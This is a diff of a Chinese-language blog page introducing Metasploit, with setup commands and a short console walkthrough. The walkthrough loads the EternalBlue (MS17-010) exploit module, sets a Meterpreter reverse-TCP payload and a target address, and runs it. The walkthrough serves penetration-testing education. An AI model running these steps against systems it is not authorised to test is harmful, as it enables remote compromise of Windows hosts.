@@ -7,13 +7,15 @@
   
   <title>Metasploit | blog小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
+  <meta name="description" content="介绍 使用  基本使用">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Metasploit">
 <meta property="og:url" content="https://my011215.github.io/2023/01/08/tool/Metasploit/index.html">
 <meta property="og:site_name" content="blog小窝">
+<meta property="og:description" content="介绍 使用  基本使用">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-01-08T13:25:30.000Z">
-<meta property="article:modified_time" content="2023-01-08T11:05:02.730Z">
+<meta property="article:published_time" content="2023-01-08T15:58:30.000Z">
+<meta property="article:modified_time" content="2023-01-08T15:58:58.097Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
   
@@ -73,7 +75,7 @@
         <section id="main"><article id="post-tool/Metasploit" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/01/08/tool/Metasploit/" class="article-date">
-  <time datetime="2023-01-08T13:25:30.000Z" itemprop="datePublished">2023-01-08</time>
+  <time datetime="2023-01-08T15:58:30.000Z" itemprop="datePublished">2023-01-08</time>
 </a>
     
   <div class="article-category">
@@ -97,8 +99,64 @@
     <div class="article-entry" itemprop="articleBody">
       
         <!-- toc -->
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8">使用</a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">基本使用</a></li>
+</ul>
+</li>
+</ul>
 <!-- tocstop -->
-<span id="more"></span>
+<span id="more"></span>  
+<h2><span id="介绍"> 介绍</span></h2>
+<p>Metasploit 是目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一。<br>
+Metasploit 提供两种不同的 UI，msfconsole 和 WebUI，主要使用 msfconsole 接口。因为 msfconsole 对 Metasploit 支持最好，可以使用所有功能。</p>
+<ul>
+<li>Metasploit Framework：<br>
+这是一个免费的、开源的渗透测试框架，当前稳定版本是使用 Ruby 语言编写的。它拥有世界上最大的渗透测试攻击数据库，每年超过 100 万次的下载。它也是迄今为止使用 Ruby 构建的最复杂的项目之一。</li>
+<li>Vulnerability：<br>
+漏洞</li>
+<li>Exploit：<br>
+攻击代码或程序，它允许攻击者利用易受攻击的系统并危害其安全性。每个漏洞都有对应的漏洞利用程序。Metasploit 有超过 1700 个漏洞利用程序。</li>
+<li>Payload：<br>
+攻击载荷。</li>
+<li>Module：<br>
+模块是一个完整的构件，每个模块执行特定的任务，并通过几个模块组成一个单元运行。这种架构的好处是可以很容易的将自己写的利用程序和工具集成到框架中。</li>
+</ul>
+<h2><span id="使用"> 使用</span></h2>
+<ul>
+<li>启动 msfconsole<br>
+ 设置 PostgreSQL 数据库，它将创建数据库用户，创建 msf 和 msf_test 数据库，配置 Metasploit 使用数据库</li>
+</ul>
+<ol>
+<li>service postgresql start</li>
+<li>msfdb init</li>
+<li>msfconsole</li>
+</ol>
+<ul>
+<li>管理 Metasploit Framework 数据库</li>
+</ul>
+<ol>
+<li>msfdb</li>
+</ol>
+<ul>
+<li>修改数据库配置文件</li>
+</ul>
+<ol>
+<li>直接编辑 database.yml<br>
+ 文件位于 /usr/share/metasploit-framework/config/database.yml</li>
+</ol>
+<ul>
+<li>检查数据库连接情况</li>
+</ul>
+<ol>
+<li>启动 msfconsole，然后执行 db_status</li>
+<li>db_disconnect ，断开连接</li>
+</ol>
+<h3><span id="基本使用"> 基本使用</span></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole										    #进入框架</span><br><span class="line">search  ms17_010                                    # 使用search命令查找相关漏洞</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块</span><br><span class="line">info     										    #使用info查看模块信息</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷</span><br><span class="line">show options    									#查看模块需要配置的参数</span><br><span class="line">set  RHOST  192.168.100.158    					    #设置参数</span><br><span class="line">exploit / run     								    #攻击</span><br><span class="line">后渗透阶段											#后渗透阶段</span><br></pre></td></tr></table></figure>
+
       
     </div>
     <footer class="article-footer">
@@ -111,19 +169,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2023/01/08/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          永恒之蓝漏洞复现
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/01/08/tool/Nmap/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/01/08/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Nmap的使用方法总结</div>
+      <div class="article-nav-title">永恒之蓝漏洞复现</div>
     </a>
   
 </nav>
@@ -167,11 +216,11 @@
       <ul>
         
           <li>
-            <a href="/2023/01/08/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/">永恒之蓝漏洞复现</a>
+            <a href="/2023/01/08/tool/Metasploit/">Metasploit</a>
           </li>
         
           <li>
-            <a href="/2023/01/08/tool/Metasploit/">Metasploit</a>
+            <a href="/2023/01/08/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/">永恒之蓝漏洞复现</a>
           </li>
         
           <li>
